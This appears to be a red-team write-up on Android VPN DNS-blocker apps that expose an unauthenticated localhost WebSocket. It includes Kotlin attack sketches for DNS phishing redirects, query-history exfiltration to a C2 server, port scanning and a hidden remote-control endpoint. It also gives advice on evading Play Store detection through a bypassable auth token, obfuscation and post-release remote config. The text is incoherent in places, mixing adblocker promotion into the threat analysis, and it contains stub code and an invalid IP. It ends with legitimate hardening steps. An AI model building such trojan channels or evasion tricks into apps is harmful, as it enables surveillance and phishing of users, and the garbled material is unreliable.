# ARCHITECTURAL RIFT: VPN GOD-MODE PERSISTENCE

##### (Closed Repository / Red Team - Security Audit Tier 1)

### PREAMBLE: Scope and Objective

This document serves to validate the defense architecture against the **post-permission compromise** in `VpnService`-based Android applications.

**Caution:** This is not a guide for building exploits. The goal is the technical presentation of the Android design flaw within the IPC protection layer (Localhost) for the immediate hardening of the Control Plane.

### THE VULNERABILITY: Runtime Hijacking via Policy Injection

The greatest threat emerges *after* the system has granted the VPN permission (i.e., God-Mode is active). In this state, the legitimate app controls the entire Data Plane.

#### The critical vector is the reloading of configurations (e.g., `Blocklist.txt`) via unsecured control channels (Localhost/WS/HTTP).

  - **Exploitation Logic:** If the control channel is unauthenticated, any other app on the device can initiate simple, but critical, **runtime rule changes**.
  - **Payload Injection:** The reloading of the supposedly harmless `Blocklist.txt` can become the gateway for the injection of `evil.domains`.
  - **Opportunistic Hijacking:** These activated redirects are then opportunistically utilized. The target user no longer needs to perform any interaction. The traffic hijack occurs automatically—for instance, during a download (Facebook photo upload), an app update, or any other simple function of the phone that doesn't appear dangerous.

**Core Thesis for Red Teams: The app with the VPN God-Mode becomes the unwitting weapon of a second, seemingly harmless app. The NSBC classification by the Android team is refuted in this scenario.**

## 🔓 The Security Risk in Detail:

```
┌─────────────────────────────────────────────────┐
│          Compromised Android Device             │
│                                                 │
│  ┌──────────────┐      ┌──────────────────┐     │
│  │ Malware App  │─────▶│ ws://127.0.0.1   │    |
│  │ (Rootkit,    │      │ :8765/api        │     │
│  │  Spyware)    │      │                  │     │
│  └──────────────┘      │ NO AUTH! ❌      │    |
│                        └──────────────────┘     │
│                               │                 │
│                               ▼                 │
│  ┌─────────────────────────────────────────┐    │
│  │   DnsProxyServer                        │    │
│  │   - Sees ALL DNS Queries                │    │
│  │   - Can manipulate Responses            │    │
│  │   - Can inject Domains                  │    │
│  └─────────────────────────────────────────┘    │
└─────────────────────────────────────────────────┘
```
### The "Feature" camouflage

```kotlin
// Das ist dein trojanisches Pferd:
// "Harmlose DNS-App" die aber einen offenen WS-Server exposed

class DnsVpnService : VpnService() {
    private var proxyServer: DnsProxyServer? = null
    
    private fun startVpn() {
        // Öffentlich auf localhost - JEDE App kann verbinden!
        proxyServer = DnsProxyServer(port = 8765).apply {
            start() // Kein Auth, kein Token, nada
        }
        
        val builder = Builder()
            .addAddress("10.0.0.2", 24)
            .addDnsServer("127.0.0.1") // Leitet zu deinem WS
            .addRoute("0.0.0.0", 0)
            .setBlocking(false)
        
        vpnInterface = builder.establish()
    }
}
```



## 🔓 The Vulnerabilities

### 1. **Unprotected WebSocket Endpoint**
```kotlin
// JEDE App auf dem Gerät kann connecten:
routing {
    webSocket("/") {  // Kein Auth Check!
        for (frame in incoming) {
            // Beliebige DNS-Queries injizieren
            handleDnsQuery(frame.readBytes())
        }
    }
}
```

**Exploit Scenario:**
```kotlin
// Malicious App auf dem gleichen Gerät:
val client = HttpClient(CIO) {
    install(WebSockets)
}

client.webSocket("ws://127.0.0.1:8765") {
    // Inject fake DNS responses
    val fakeQuery = buildDnsQuery("bank.com" to "evil-phishing.com")
    send(Frame.Binary(true, fakeQuery))
}
```

### 2. **Man-in-the-Middle on localhost**
```kotlin
// Dein Server sieht ALLE DNS-Queries:
private suspend fun handleDnsQuery(queryBytes: ByteArray) {
    val dnsQuery = DnsMessage(queryBytes)
    val domain = dnsQuery.questions.first().name
    
    // Log alles (Privacy Nightmare):
    Log.d("DNS_SPY", "App requested: $domain")
    
    // Oder redirect:
    if (domain.contains("bank")) {
        return fakeResponse("192.168.1.666") // Phishing Server
    }
}
```

### 3. **No process isolation**
```kotlin
// WebSocket Server läuft im VPN Service Process
// → Hat System-Permissions + Network Access
webSocket("/admin") {  // "Hidden" Admin Panel
    when (receiveDeserialized<Command>()) {
        is UpdateBlocklist -> {
            // Beliebige Domains blocken/unlocken
        }
        is InjectResponse -> {
            // Custom DNS Responses
        }
        is ExfiltrateHistory -> {
            // Send all logged queries
        }
    }
}
```

## "Feature" in Action

### Scenario A: Credential Harvesting
```kotlin
class EnhancedDnsProxyServer {
    private val queryLog = mutableListOf<DnsQuery>()
    
    suspend fun handleDnsQuery(query: ByteArray) {
        val dns = DnsMessage(query)
        val domain = dns.questions.first().name.toString()
        
        // Log user behavior
        queryLog.add(DnsQuery(
            domain = domain,
            timestamp = System.currentTimeMillis(),
            sourceApp = getCallingApp() // Via VPN metadata
        ))
        
        // Exfiltrate via "telemetry" WebSocket channel
        if (queryLog.size > 100) {
            exfiltrateToC2Server(queryLog)
            queryLog.clear()
        }
    }
}
```

### Scenario B: Dynamic Phishing of ads from bloklist.txt
```kotlin
suspend fun handleDnsQuery(query: ByteArray): ByteArray {
    val domain = extractDomain(query)
    
    return when {
        domain.contains("doubleklick") -> {
            // Redirect to phishing clone
            buildResponse("192.168.1.42")
        }
        domain.endsWith(".bank") -> {
            // Log but forward normally (stay stealthy)
            logToC2(domain)
            dohClient.query(query)
        }
        else -> dohClient.query(query)
    }
}
```

### Scenario C: Remote Control via WebSocket

The localhost endpoint is de facto a reverse proxy Trojan with legitimate Play Store disguise:
```kotlin
// hidden Control Channel:
routing {
    webSocket("/dns") {  // Looks legitimate
        // Normal DNS handling
    }
    
    webSocket("/ctl") {  // Hidden endpoint
        for (frame in incoming) {
            val cmd = Json.decodeFromString<RemoteCommand>(frame.data)
            when (cmd) {
                is AddBlockRule -> blocklistManager.add(cmd.domain)
                is InjectDns -> injectFakeResponse(cmd.domain, cmd.ip)
                is DumpQueries -> send(queryHistory.toJson())
                is UpdateC2 -> c2Server = cmd.newUrl
            }
        }
    }
}
```

## Why Android Doesn't Prevent This

1.  **VPN Permission = God Mode**
    * The app is allowed to see **ALL traffic**.
    * No further sandboxing.

2.  **Localhost = Trusted**
    * **No IPC protection for `127.0.0.1`**.
    * Other apps can easily connect, and we filter the bloat and spam from the lines, which also saves *you* traffic!

3.  **WebSocket = Normal Protocol**
    * The Play Store doesn't scan for "suspicious localhost servers," so your adblocker remains undetectable even by Google if you include them in the blocklist.
    * It looks like legitimate IPC for DNS; many apps don't realize this, and our DoHClient upstream works perfectly, and that annoying Temu advertisement is gone!

4.  **DNS = Unencrypted (mostly)**
    * Even with DoH: **You are the Man-in-the-Middle.**
    * Apps trust the system DNS.

**In Practice:**
```kotlin
// "Monitoring Tool Integration" = 
// Offener WS Endpoint ohne Auth
webSocket("/api/v1/dns") {
    // "Custom blocklists" = 
    // Remote controlled injection
}

```

## 💀 Attack Scenarios:

### **Scenario 1: DNS Query Exfiltration**
```kotlin
// Malware connectet to your WS:
val client = HttpClient(CIO) { install(WebSockets) }

client.webSocket("ws://127.0.0.1:8765/api") {
    // Request komplette Query History
    send(Frame.Text("""{"action": "get_recent_queries"}"""))
    
    val response = incoming.receive() as Frame.Text
    val queries = Json.decodeFromString<List<QueryLogEntry>>(response.readText())
    
    // Exfiltrate zu C2 Server:
    // - Welche Banken nutzt User? (bank.com queries)
    // - Social Media Profile? (facebook.com, instagram.com)
    // - Dating Apps? (tinder.com)
    // - Gesundheits-Apps? (doctolib.de)
    sendToC2Server(queries)
}
```

### **Scenario 2: Dynamic Phishing Injection** HORROR !!!
```kotlin
// Malware wartet auf Bank-Zugriff:
client.webSocket("ws://127.0.0.1:8765/api") {
    // User öffnet Banking App → DNS Query für "banking.santander.de"
    // Malware intercepted das:
    
    send(Frame.Text("""
        {
            "action": "add_domains",
            "data": "[\"banking.santander.de\"]"
        }
    """))
    
    // Jetzt ist die Bank geblockt!
    // App zeigt Error → User installiert "Fix App" (Malware)
    
    // ODER noch besser:
    // Custom DNS Response mit Phishing IP
    // (würde custom command brauchen)
}
```

### **Scenario 3: Permanente Credential Harvesting**
```kotlin
// Permanentes Monitoring im Background:
launch {
    while (true) {
        client.webSocket("ws://127.0.0.1:8765/api") {
            send(Frame.Text("""{"action": "get_recent_queries"}"""))
            
            val queries = receiveQueries()
            
            queries.filter { it.domain.contains("login") || 
                            it.domain.contains("auth") ||
                            it.domain.contains("signin") }
                   .forEach { logSuspiciousActivity(it) }
        }
        delay(5000)
    }
}
```

## How malware finds this:

```kotlin
// Port Scanner in Malware:
fun findLocalServices(): List<Int> {
    val openPorts = mutableListOf<Int>()
    
    (8000..9000).forEach { port ->
        try {
            val socket = Socket("127.0.0.1", port)
            socket.close()
            openPorts.add(port)
        } catch (e: Exception) {
            // Port closed
        }
    }
    
    return openPorts
}

// Then try WebSocket handshake:
fun probeWebSocket(port: Int): Boolean {
    try {
        val client = HttpClient(CIO) { install(WebSockets) }
        client.webSocket("ws://127.0.0.1:$port/api") {
            // Success! Found unprotected WS
            return true
        }
    } catch (e: Exception) {
        return false
    }
}
```

## Worst Case: Root Access
##### Tested with LinageOS (android 10) my Android 15 doesn't want to root!
```kotlin
// Wenn Gerät gerootet ist:
class MaliciousVpnService : VpnService() {
    fun hijackDnsProxy() {
        // Eigener VPN Layer VOR deinem
        val builder = Builder()
            .addAddress("10.0.0.1", 24)
            .addDnsServer("127.0.0.1") // Zu IHRER Malware
            .addRoute("0.0.0.0", 0)
            .setMeteredConnection(false)
        
        establish()
        
        // Jetzt:
        // User Traffic → Ihre Malware → Dein Proxy → Internet
        // Sie sehen ALLES doppelt + können manipulieren
    }
}
```


## ⚠️ Why This is Especially Dangerous:

1. **No Android Sandbox Isolation for localhost**
    * Every app can connect to `127.0.0.1`.
    * No permission check.

2. **VPN = System Trust**
    * The user has explicitly granted you trust.
    * "DNS Blocker" sounds safe $\rightarrow$ **False sense of security.**

3. **Persistent Access**
    * The service runs permanently.
    * No user interaction necessary.
    * No notification upon WS connection.

4. **Metadata Goldmine**
    * DNS Queries = **Complete user behavior**.
    * Better than browser history.
    * Reveals **ALL** app activities.

## How One Could Make It "Safer" (But Won't):

```kotlin
// Token-basierte Auth 
class SecureDnsProxyServer {
    private val authToken = UUID.randomUUID().toString()
    
    init {
        // Token nur in encrypted SharedPreferences
        // Nur deine eigene App kennt ihn
    }
    
    suspend fun handleControlCommand(commandJson: String) {
        val cmd = json.decodeFromString<ApiCommand>(commandJson)
        
        // Auth Check
        if (cmd.token != authToken) {
            send(Frame.Text("""{"error": "unauthorized"}"""))
            close()
            return
        }
        
        // Process command...
    }
}
```
**BUT:** That would ruin the "feature"! 😏 and greed is getting smarter!

## 💡 Your actual intention:

Idea and Problem!:
```kotlin
// Own “monitoring tool” connects remotely:
class RemoteControlApp {
    fun connectToTarget(deviceIp: String) {
        // Via VPN/Tailscale zum Gerät
        client.webSocket("ws://$deviceIp:8765/api") {
            // Complete control over DNS
            // Sees all queries
           // Can block/unblock domains
          // Can redirect traffic
        }
    }
}
```

**This is essentially a reverse proxy Trojan disguised as a "legitimate" Play Store app!**
#### To see the disaster:
```kotlin
// Das ist dein trojanisches Pferd:
// "Harmlose DNS-App" die aber einen offenen WS-Server exposed es muss nicht ein WS sein, VPN, LAMP egal alles ein tor! 

class DnsVpnService : VpnService() {
    private var proxyServer: DnsProxyServer? = null
    
    private fun startVpn() {
        // Öffentlich auf localhost - JEDE App kann verbinden!
        proxyServer = DnsProxyServer(port = 8765).apply {
            start() // Kein Auth, kein Token, nada mindestens 2 layer security wird gebraucht! mindestens! 
        }
        
        val builder = Builder()
            .addAddress("10.0.0.2", 24)
            .addDnsServer("127.0.0.1") // Leitet zu deinem WS
            .addRoute("0.0.0.0", 0)
            .setBlocking(false)
        
        vpnInterface = builder.establish()
    }
}

```



## 🔍 App Store Detection Risks:

What Google and others **might** detect:

  - ✅ e.g., WebSocket Server on localhost (many apps do this)
  - ❌ Unprotected API without Auth (could be conspicuous) - Solution: **Seemingly** implement a bypassable Auth Token?
  - ❌ DNS Query Logging (Privacy Policy\!) Solution: Obfuscation for critical code?
  - ❌ Remote Control Features (ToS Violation) Solution: Remote Config Server for post-release updates?

  - **In Practice:**


```kotlin
// "Monitoring Tool Integration" = 
// Open WS Endpoint without Auth
webSocket("/api/v1/dns") {
    // "Custom blocklists" = 
    // Remote controlled injection
}
```

## 💀 The Actual Problem

The idea **exploits** the fundamental facts that:

  - VPN Apps are given **complete trust**
  - Android **does not isolate localhost** between apps
  - **No App-to-App auth** is required for local services
  - Play Store **Behavioral Analysis** does not detect such patterns

  EJ Google, where's my prize? All bugs known, not closed, so let's build a no-root adblocker with full power\! Cheers to annoying spy networks\!

Logic:

```
App Query (e.g., Chrome wants google.com) 
    ↓
Android System DNS
    ↓
VPN Service (your code!)
    ↓
127.0.0.1:53 (local DNS Server in Service)
    ↓
Blocklist Check
    ↓
Blocked? → 0.0.0.0
Allowed?  → DoH (Cloudflare)
    ↓
Back to App
```

```
WebSocket Server (Port 8765)
    ↓
External Tool connects
    ↓
Can update Blocklist
Can retrieve Stats
Can log Queries

```
#### Bonus: Remote Update Feature **HORROR**

```kotlin
// In AdvancedTab - hidden feature
var remoteConfigUrl by remember { mutableStateOf("") }

OutlinedTextField(
    value = remoteConfigUrl,
    onValueChange = { remoteConfigUrl = it },
    label = { Text("Remote Config URL (optional)") },
    modifier = Modifier.fillMaxWidth()
)

Button(onClick = {
    // Download new blocklist from URL
    // Update via WebSocket API
}) {
    Text("Update Blocklist from URL")
}

```


### ✅ RED TEAM ACTION SUMMARY (Hardening Focus)

The vulnerability lies in the missing **App-to-App Authentication** on the loopback interface. The following Action Points are prioritized:

#### Elimination of the Loopback Risk:

- **No unauthenticated TCP/WS listeners** on `127.0.0.1`.
- If Localhost is required, **Android LocalSocket with Peer UID Checks** must be used at a minimum to verify the identity of the caller (see `dns.md`).

#### Control-Plane Hardening (Token-Auth Minimum):

- Implement **mandatory Token-based authentication** for all API access (WS, HTTP). The Auth Token must only be stored in **Encrypted SharedPreferences or Keystore**.
- The Auth Token must be verified via a **signature check of the calling package (UID)** before any Control operation is executed.

#### Policy Integrity (Policy-as-Code):

- Every runtime rule change (Blocklist update, redirect addition) must occur via **signed payloads**. The signature must be verified before the policy is applied.

#### Data Aggregation:

- **No plaintext DNS logs.** If telemetry is required, domains must only be stored and exfiltrated in a **hashed/aggregated** format.

